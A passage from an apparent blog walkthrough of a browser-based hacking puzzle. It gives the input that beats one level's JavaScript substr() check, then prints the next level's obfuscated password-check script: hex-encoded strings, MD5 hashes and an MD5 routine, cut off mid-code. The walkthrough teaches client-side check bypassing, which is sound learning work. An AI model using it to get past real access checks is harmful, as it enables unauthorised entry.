<p>The only way not to get..noticed, is to enter something that would match <em>substr()</em> method. <a href="http://www.w3schools.com/jsref/jsref_substr.asp">This method</a> extracts parts of a string, beginning at the character at the specified position, and returns the specified number of characters. So the code is looking in our input for the string Ikdf076 starting at the third character. I entered 00Ikdf076 and penetrated deeper into the intranet!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level7b.png" title="primer level 7" alt="primer level 7"></p>

<p>Moving further, looks like another reloading page.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level8.png" title="primer level 8" alt="primer level 8"></p>

<p>Reading the source, there is another script that we have to decipher:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;JavaScript&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">_0x5cf4</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;\x6C\x65\x6E\x67\x74\x68&quot;</span><span class="p">,</span><span class="s2">&quot;\x73\x75\x62\x73\x74\x72\x69\x6E\x67&quot;</span><span class="p">,</span><span class="s2">&quot;\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74&quot;</span><span class="p">,</span><span class="s2">&quot;\x73\x70\x6C\x69\x74&quot;</span><span class="p">,</span><span class="s2">&quot;\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65\x66&quot;</span><span class="p">,</span><span class="s2">&quot;\x6A\x6F\x69\x6E&quot;</span><span class="p">,</span><span class="s2">&quot;\x68\x65\x6C\x6C\x6F&quot;</span><span class="p">,</span><span class="s2">&quot;\x35\x64\x34\x31\x34\x30\x32\x61\x62\x63\x34\x62\x32\x61\x37\x36\x62\x39\x37\x31\x39\x64\x39\x31\x31\x30\x31\x37\x63\x35\x39\x32&quot;</span><span class="p">,</span><span class="s2">&quot;\x30\x64\x32\x38\x63\x62\x61\x30\x62\x64\x34\x66\x32\x36\x65\x31\x36\x64\x37\x36\x36\x30\x30\x30\x64\x32\x37\x65\x34\x39\x66\x61&quot;</span><span class="p">,</span><span class="s2">&quot;\xA7\x23\x2F\x24&quot;</span><span class="p">,</span><span class="s2">&quot;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&quot;</span><span class="p">,</span><span class="s2">&quot;\x2E\x2F\x5F\x2E\x70\x68\x70&quot;</span><span class="p">,</span><span class="s2">&quot;\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65&quot;</span><span class="p">,</span><span class="s2">&quot;\x6C\x6F\x61\x64\x69\x6E\x67&quot;</span><span class="p">,</span><span class="s2">&quot;\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64&quot;</span><span class="p">,</span><span class="s2">&quot;\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72&quot;</span><span class="p">,</span><span class="s2">&quot;\x20\x20\x20\x20\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x20\x20\x3C\x68\x31\x3E\x5B\x2B\x2B\x51\x2B\x2B\x2B\x2B\x2B\x2B\x5D\x3C\x2F\x68\x31\x3E\x20\x20\x20\x20\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x6C\x6F\x6E\x67\x65\x72\x20\x73\x75\x72\x65\x20\x77\x68\x61\x74\x20\x68\x65\x72\x20\x6F\x72\x69\x67\x69\x6E\x61\x6C\x20\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x2E\x20\x42\x75\x74\x20\x69\x74\x20\x64\x69\x64\x6E\x27\x74\x20\x6D\x61\x74\x74\x65\x72\x20\x61\x6E\x79\x77\x61\x79\x2E\x20\x57\x68\x61\x74\x20\x73\x74\x69\x6C\x6C\x20\x6D\x61\x74\x74\x65\x72\x65\x64\x20\x77\x61\x73\x20\x67\x65\x74\x74\x69\x6E\x67\x20\x6F\x75\x74\x20\x6F\x66\x20\x68\x65\x72\x65\x2C\x20\x61\x6C\x69\x76\x65\x2E\x20\x20\x20\x20\x20\x20\x4C\x6F\x67\x20\x6F\x75\x74\x2C\x20\x74\x65\x6C\x6C\x20\x74\x68\x65\x20\x63\x6C\x69\x65\x6E\x74\x20\x74\x6F\x20\x67\x6F\x20\x66\x75\x63\x6B\x20\x68\x69\x6D\x73\x65\x6C\x66\x20\x61\x6E\x64\x20\x67\x65\x74\x20\x61\x20\x66\x69\x78\x20\x6F\x66\x20\x6E\x30\x69\x73\x65\x20\x74\x6F\x20\x73\x68\x75\x74\x20\x6F\x66\x66\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x52\x65\x6C\x61\x78\x20\x77\x69\x74\x68\x20\x61\x20\x6D\x69\x6E\x64\x6C\x65\x73\x73\x20\x68\x6F\x6C\x6F\x20\x66\x6C\x69\x63\x6B\x20\x61\x6E\x64\x20\x6E\x65\x76\x65\x72\x20\x6C\x6F\x6F\x6B\x20\x62\x61\x63\x6B\x20\x61\x74\x20\x74\x68\x69\x73\x20\x77\x65\x69\x72\x64\x20\x6A\x6F\x62\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x41\x20\x76\x69\x6F\x6C\x65\x6E\x74\x20\x6E\x65\x6F\x6E\x20\x66\x6C\x69\x63\x6B\x65\x72\x20\x61\x70\x70\x65\x61\x72\x65\x64\x20\x61\x74\x20\x74\x68\x65\x20\x68\x6F\x72\x69\x7A\x6F\x6E\x2E\x20\x4E\x6F\x20\x74\x68\x75\x6E\x64\x65\x72\x20\x66\x6F\x6C\x6C\x6F\x77\x65\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x73\x74\x61\x72\x65\x64\x20\x69\x6E\x20\x74\x68\x65\x20\x64\x69\x73\x74\x61\x6E\x63\x65\x20\x77\x69\x74\x68\x20\x61\x20\x62\x6C\x61\x6E\x6B\x20\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x22\x48\x65\x6C\x6C\x6F\x2C\x20\x4E\x69\x65\x76\x65\x2E\x22\x20\x41\x20\x64\x65\x65\x70\x2C\x20\x66\x65\x6D\x69\x6E\x69\x6E\x65\x2C\x20\x64\x69\x67\x69\x74\x61\x6C\x20\x76\x6F\x69\x63\x65\x20\x72\x6F\x61\x72\x65\x64\x20\x69\x6E\x20\x68\x65\x72\x20\x68\x65\x61\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x46\x55\x43\x4B\x21\x20\x54\x68\x69\x73\x20\x77\x61\x73\x20\x68\x65\x72\x20\x72\x65\x61\x6C\x20\x6E\x61\x6D\x65\x2E\x20\x53\x68\x65\x20\x68\x61\x64\x6E\x27\x74\x20\x75\x73\x65\x64\x20\x69\x74\x20\x69\x6E\x20\x79\x65\x61\x72\x73\x2E\x2E\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x22\x49\x20\x77\x69\x6C\x6C\x20\x6C\x6F\x67\x6F\x75\x74\x20\x61\x6E\x64\x20\x73\x74\x6F\x70\x20\x74\x68\x69\x73\x20\x73\x68\x69\x74\x20\x72\x69\x67\x68\x74\x20\x66\x75\x63\x6B\x69\x6E\x67\x20\x6E\x6F\x77\x21\x22\x20\x53\x68\x65\x20\x73\x63\x72\x65\x61\x6D\x65\x64\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x6E\x65\x6F\x6E\x20\x65\x78\x70\x61\x6E\x73\x65\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x4E\x6F\x74\x68\x69\x6E\x67\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x64\x69\x64\x6E\x27\x74\x2E\x20\x53\x6F\x6D\x65\x74\x68\x69\x6E\x67\x20\x62\x65\x73\x69\x64\x65\x20\x74\x68\x65\x20\x66\x65\x61\x72\x20\x6F\x63\x63\x75\x70\x69\x65\x64\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x49\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x20\x74\x68\x65\x72\x65\x20\x73\x69\x6E\x63\x65\x20\x74\x68\x65\x20\x73\x65\x63\x6F\x6E\x64\x20\x6E\x6F\x64\x65\x20\x61\x6E\x64\x20\x67\x72\x65\x77\x20\x73\x74\x72\x6F\x6E\x67\x65\x72\x20\x77\x69\x74\x68\x20\x65\x76\x65\x72\x79\x20\x6D\x6F\x76\x65\x2E\x20\x54\x68\x65\x72\x65\x20\x77\x61\x73\x20\x61\x20\x70\x61\x74\x74\x65\x72\x6E\x20\x69\x6E\x20\x74\x68\x65\x20\x70\x61\x74\x68\x20\x73\x68\x65\x20\x68\x61\x64\x20\x74\x61\x6B\x65\x6E\x20\x74\x68\x72\x6F\x75\x67\x68\x20\x74\x68\x65\x20\x6E\x65\x74\x77\x6F\x72\x6B\x2E\x20\x41\x6E\x20\x61\x72\x74\x69\x66\x69\x63\x69\x61\x6C\x20\x70\x61\x74\x74\x65\x72\x6E\x2C\x20\x6C\x61\x79\x65\x64\x20\x6F\x75\x74\x20\x62\x79\x20\x73\x6F\x6D\x65\x6F\x6E\x65\x20\x6F\x72\x20\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x54\x68\x65\x72\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x68\x69\x6E\x74\x2C\x20\x6E\x6F\x20\x6F\x62\x76\x69\x6F\x75\x73\x20\x73\x74\x65\x70\x2E\x20\x46\x69\x6E\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x6E\x65\x78\x74\x20\x6E\x6F\x64\x65\x20\x77\x6F\x75\x6C\x64\x20\x62\x65\x20\x74\x68\x65\x20\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65\x2C\x20\x6F\x72\x20\x6D\x61\x79\x62\x65\x20\x6D\x6F\x72\x65\x20\x6C\x69\x6B\x65\x20\x61\x20\x74\x65\x73\x74\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E&quot;</span><span class="p">,</span><span class="s2">&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;</span><span class="p">,</span><span class="s2">&quot;\x66\x6F\x6F&quot;</span><span class="p">,</span><span class="s2">&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*&quot;Someone didn&#39;t bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and...&quot; - The Plague*/</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">md5cycle</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="o">-</span><span class="mi">680876936</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">12</span><span class="p">,</span><span class="o">-</span><span class="mi">389564586</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">17</span><span class="p">,</span><span class="mi">606105819</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">22</span><span class="p">,</span><span class="o">-</span><span class="mi">1044525330</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="o">-</span><span class="mi">176418897</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="mi">12</span><span class="p">,</span><span class="mi">1200080426</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="mi">17</span><span class="p">,</span><span class="o">-</span><span class="mi">1473231341</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="mi">22</span><span class="p">,</span><span class="o">-</span><span class="mi">45705983</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="mi">1770035416</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="mi">12</span><span class="p">,</span><span class="o">-</span><span class="mi">1958414417</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="mi">17</span><span class="p">,</span><span class="o">-</span><span class="mi">42063</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span><span class="mi">22</span><span class="p">,</span><span class="o">-</span><span class="mi">1990404162</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="mi">1804603682</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span><span class="mi">12</span><span class="p">,</span><span class="o">-</span><span class="mi">40341101</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span><span class="mi">17</span><span class="p">,</span><span class="o">-</span><span class="mi">1502002290</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="mi">22</span><span class="p">,</span><span class="mi">1236535329</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="o">-</span><span class="mi">165796510</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="mi">9</span><span class="p">,</span><span class="o">-</span><span class="mi">1069501632</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span><span class="mi">14</span><span class="p">,</span><span class="mi">643717713</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">20</span><span class="p">,</span><span class="o">-</span><span class="mi">373897302</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="o">-</span><span class="mi">701558691</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="mi">9</span><span class="p">,</span><span class="mi">38016083</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="mi">14</span><span class="p">,</span><span class="o">-</span><span class="mi">660478335</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mi">20</span><span class="p">,</span><span class="o">-</span><span class="mi">405537848</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">568446438</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span><span class="mi">9</span><span class="p">,</span><span class="o">-</span><span class="mi">1019803690</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">14</span><span class="p">,</span><span class="o">-</span><span class="mi">187363961</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="mi">20</span><span class="p">,</span><span class="mi">1163531501</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="o">-</span><span class="mi">1444681467</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">9</span><span class="p">,</span><span class="o">-</span><span class="mi">51403784</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="mi">14</span><span class="p">,</span><span class="mi">1735328473</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span><span class="mi">20</span><span class="p">,</span><span class="o">-</span><span class="mi">1926607734</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">hh</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="mi">4</span><span class="p">,</span><span class="o">-</span><span class="mi">378558</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">hh</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="mi">11</span><span class="p">,</span><span class="o">-</span><span class="mi">2022574463</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">hh</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span><span class="mi">16</span><span class="p">,</span><span class="mi">1839030562</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span 